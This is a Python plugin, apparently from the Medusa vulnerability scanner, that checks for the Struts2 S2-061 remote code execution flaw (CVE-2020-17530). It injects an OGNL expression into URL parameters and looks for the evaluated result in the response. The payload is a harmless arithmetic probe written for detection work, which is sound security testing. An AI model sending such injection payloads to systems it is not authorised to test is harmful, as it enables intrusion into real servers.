#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,randoms,UniformResourceLocatorParameterSubstitution
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2020-17530" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-12-29"  # 插件编辑时间
        self.info['disclosure']='2020-12-8'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability61"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞61' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "本次漏洞是对S2-059漏洞修复后的绕过。S2-059的修复补丁仅修复了沙盒绕过，但是并没有修复OGNL表达式的执行。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "更新到最新的2.5.26版本"  # 修复建议
        self.info['version'] = "struts 2.0.0 - struts 2.5.25"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果




def medusa(**kwargs)->None:

    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    RM=randoms().result(10)
    RN=randoms().Numbers(5)
    try:
        payload_url = UniformResourceLocatorParameterSubstitution().Result(url=url,vals="%25%7b+%27"+RM+"%27+%2b+("+RN+"+%2b+"+RN+").toString()%7d")[0]


        resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
        con = resp.text

        if resp.status_code==200 and con.find(RM+str(int(RN)*2))!=-1:
            Medusa = "存在Struts2远程代码执行漏洞(S2-061)\r\n漏洞详情:\r\n版本号:S2-061\r\n使用EXP:{}\r\n返回数据:{}\r\n".format(payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

